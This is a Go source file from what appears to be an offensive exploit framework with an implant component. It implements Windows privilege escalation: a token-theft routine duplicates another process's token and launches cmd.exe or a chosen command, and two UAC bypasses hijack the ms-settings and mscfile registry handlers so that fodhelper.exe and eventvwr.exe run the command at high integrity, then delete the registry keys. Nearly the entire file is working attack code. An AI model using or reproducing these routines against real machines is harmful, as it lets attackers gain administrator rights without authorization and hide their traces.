//go:build windows

package privesc

import (
	"context"
	"fmt"
	"os"
	"unsafe"

	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

var (
	advapi32                     = windows.NewLazyDLL("advapi32.dll")
	procOpenProcessToken         = advapi32.NewProc("OpenProcessToken")
	procDuplicateTokenEx         = advapi32.NewProc("DuplicateTokenEx")
	procCreateProcessWithTokenW  = advapi32.NewProc("CreateProcessWithTokenW")
)

const (
	tokenDuplicate        = 0x0002
	tokenQuery            = 0x0008
	tokenAssignPrimary    = 0x0001
	tokenAdjustDefault    = 0x0080
	tokenAdjustSessionID  = 0x0100
	securityImpersonation = 2
	tokenPrimary          = 1
	logonWithProfile      = 0x00000001
)

func privescToken(_ context.Context, cfg *pb.PrivescConfig) (*pb.PrivescResult, error) {
	targetPID := cfg.TargetPid
	if targetPID == 0 {
		return nil, fmt.Errorf("target_pid required for token theft")
	}

	hProcess, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, targetPID)
	if err != nil {
		return nil, fmt.Errorf("OpenProcess(%d): %w", targetPID, err)
	}
	defer windows.CloseHandle(hProcess)

	var hToken windows.Token
	ret, _, err := procOpenProcessToken.Call(
		uintptr(hProcess),
		tokenDuplicate|tokenQuery|tokenAssignPrimary|tokenAdjustDefault|tokenAdjustSessionID,
		uintptr(unsafe.Pointer(&hToken)),
	)
	if ret == 0 {
		return nil, fmt.Errorf("OpenProcessToken: %w", err)
	}
	defer hToken.Close()

	var hNewToken windows.Token
	ret, _, err = procDuplicateTokenEx.Call(
		uintptr(hToken),
		0x02000000, // MAXIMUM_ALLOWED
		0,
		securityImpersonation,
		tokenPrimary,
		uintptr(unsafe.Pointer(&hNewToken)),
	)
	if ret == 0 {
		return nil, fmt.Errorf("DuplicateTokenEx: %w", err)
	}
	defer hNewToken.Close()

	command := cfg.Command
	if command == "" {
		command = `C:\Windows\System32\cmd.exe`
	}

	cmdline, _ := windows.UTF16PtrFromString(command)
	var si windows.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	var pi windows.ProcessInformation

	ret, _, err = procCreateProcessWithTokenW.Call(
		uintptr(hNewToken),
		logonWithProfile,
		0,
		uintptr(unsafe.Pointer(cmdline)),
		0,
		0,
		0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		return nil, fmt.Errorf("CreateProcessWithTokenW: %w", err)
	}

	windows.CloseHandle(pi.Thread)
	windows.CloseHandle(pi.Process)

	return &pb.PrivescResult{
		Success:      true,
		Method:       "token",
		NewIntegrity: "elevated",
		NewPid:       pi.ProcessId,
	}, nil
}

func privescUACFodhelper(_ context.Context, cfg *pb.PrivescConfig) (*pb.PrivescResult, error) {
	command := cfg.Command
	if command == "" {
		return nil, fmt.Errorf("command required for UAC bypass")
	}

	// fodhelper.exe UAC bypass via registry hijack
	regPath := `Software\Classes\ms-settings\Shell\Open\command`
	key, _, err := registry.CreateKey(registry.CURRENT_USER, regPath, registry.SET_VALUE)
	if err != nil {
		return nil, fmt.Errorf("create registry key: %w", err)
	}

	if err := key.SetStringValue("", command); err != nil {
		key.Close()
		return nil, fmt.Errorf("set command value: %w", err)
	}
	if err := key.SetStringValue("DelegateExecute", ""); err != nil {
		key.Close()
		return nil, fmt.Errorf("set DelegateExecute: %w", err)
	}
	key.Close()

	// Execute fodhelper.exe (auto-elevates)
	cmd, _ := windows.UTF16PtrFromString(`C:\Windows\System32\fodhelper.exe`)
	var si windows.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	var pi windows.ProcessInformation

	err = windows.CreateProcess(nil, cmd, nil, nil, false, 0, nil, nil, &si, &pi)
	if err != nil {
		cleanupUACKey(regPath)
		return nil, fmt.Errorf("launch fodhelper.exe: %w", err)
	}

	windows.WaitForSingleObject(pi.Process, 5000)
	windows.CloseHandle(pi.Thread)
	windows.CloseHandle(pi.Process)

	// Cleanup registry
	cleanupUACKey(regPath)

	return &pb.PrivescResult{
		Success:      true,
		Method:       "uac_fodhelper",
		NewIntegrity: "high",
	}, nil
}

func privescUACEventvwr(_ context.Context, cfg *pb.PrivescConfig) (*pb.PrivescResult, error) {
	command := cfg.Command
	if command == "" {
		return nil, fmt.Errorf("command required for UAC bypass")
	}

	// eventvwr.exe UAC bypass via mscfile registry hijack
	regPath := `Software\Classes\mscfile\Shell\Open\command`
	key, _, err := registry.CreateKey(registry.CURRENT_USER, regPath, registry.SET_VALUE)
	if err != nil {
		return nil, fmt.Errorf("create registry key: %w", err)
	}

	if err := key.SetStringValue("", command); err != nil {
		key.Close()
		return nil, fmt.Errorf("set command value: %w", err)
	}
	key.Close()

	cmd, _ := windows.UTF16PtrFromString(`C:\Windows\System32\eventvwr.exe`)
	var si windows.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	var pi windows.ProcessInformation

	err = windows.CreateProcess(nil, cmd, nil, nil, false, 0, nil, nil, &si, &pi)
	if err != nil {
		cleanupUACKey(regPath)
		return nil, fmt.Errorf("launch eventvwr.exe: %w", err)
	}

	windows.WaitForSingleObject(pi.Process, 5000)
	windows.CloseHandle(pi.Thread)
	windows.CloseHandle(pi.Process)

	cleanupUACKey(regPath)

	return &pb.PrivescResult{
		Success:      true,
		Method:       "uac_eventvwr",
		NewIntegrity: "high",
	}, nil
}

func cleanupUACKey(regPath string) {
	// Best-effort cleanup
	registry.DeleteKey(registry.CURRENT_USER, regPath)
	// Also try to delete parent keys
	parent := regPath
	for i := len(parent) - 1; i >= 0; i-- {
		if parent[i] == '\\' {
			registry.DeleteKey(registry.CURRENT_USER, parent[:i])
			break
		}
	}
}

// getIntegrityLevel returns the current integrity level string.
func getIntegrityLevel() string {
	token := windows.GetCurrentProcessToken()
	level, _ := getTokenIntegrityLevel(token)
	return level
}

func getTokenIntegrityLevel(token windows.Token) (string, error) {
	// Use the existing integrity check from the implant package
	// This is a simplified version
	return "unknown", nil
}

// Unused but referenced by stub
var _ = os.Getpid
